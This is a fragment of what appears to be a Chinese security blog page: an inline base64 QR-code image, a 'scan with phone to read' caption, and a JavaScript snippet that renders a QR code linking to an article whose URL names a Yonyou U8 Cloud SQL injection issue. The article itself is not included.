![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-u8cloud-QuerySoapServlet-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 